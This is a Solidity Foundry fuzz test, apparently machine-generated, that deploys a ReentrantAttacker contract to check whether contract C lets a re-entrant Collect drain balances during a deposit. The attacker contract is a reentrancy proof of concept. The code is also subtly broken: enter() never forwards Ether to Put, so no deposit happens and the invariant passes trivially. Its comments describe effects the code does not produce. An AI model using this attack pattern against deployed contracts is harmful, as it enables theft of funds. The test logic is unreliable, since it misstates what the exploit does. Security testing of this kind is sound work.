pragma solidity ^0.8.0;
import {Test} from "forge-std/Test.sol";
import {C} from "../src/C_under_test.sol";

contract InvMutTest is Test {
    C c;
    function setUp() public { c = new C(address(this)); }

    function testFuzz_property(uint104 amount) public {
        // Bound amount to a range that avoids overflow and is Admissible
        amount = uint104(bound(uint256(amount), 1, type(uint104).max));
        vm.assume(amount >= 1);

        // Deploy a re-entrant attacker that, when AddMessage is called,
        // re-enters into c.Collect to drain the balance before the deposit is recorded.
        ReentrantAttacker attacker = new ReentrantAttacker(c, amount);

        // Provide the attacker with enough Ether to make the deposit
        vm.deal(address(attacker), amount);

        // Record initial total (balance + total collected) for the attacker
        (uint unlockTimeBefore, uint balanceBefore) = c.Acc(address(attacker));
        uint collectedBefore = attacker.totalCollected();
        uint sumBefore = balanceBefore + collectedBefore;

        // The attacker calls Put, which triggers the re-entrant sequence
        vm.prank(address(attacker));
        attacker.enter{value: amount}();

        // After the call, measure the total again
        (uint unlockTimeAfter, uint balanceAfter) = c.Acc(address(attacker));
        uint collectedAfter = attacker.totalCollected();
        uint sumAfter = balanceAfter + collectedAfter;

        // Invariant: the total of (balance + collected) must be >= the previous total
        // The bug allows a re-entrant Collect to drain the balance before the deposit is recorded,
        // so sumAfter = sumBefore - amount, breaking the invariant.
        assertTrue(sumAfter >= sumBefore);
    }
}

contract ReentrantAttacker {
    C public target;
    uint256 public totalCollected;
    uint256 public depositAmount;
    bool private _isReentering;

    constructor(C _target, uint256 _depositAmount) {
        target = _target;
        depositAmount = _depositAmount;
    }

    function enter() external payable {
        require(msg.value == depositAmount);
        target.Put(0);
    }

    receive() external payable nonReentrant {
        // During the original Put call, AddMessage will send Ether back to us
        // triggering this receive. We then re-enter Collect.
        if (!_isReentering) {
            _isReentering = true;
            (, uint256 balance) = target.Acc(address(this));
            if (balance >= depositAmount) {
                target.Collect(depositAmount);
                totalCollected += depositAmount;
            }
            _isReentering = false;
        }
    }

    modifier nonReentrant() {
        require(!_isReentering);
        _;
    }
}

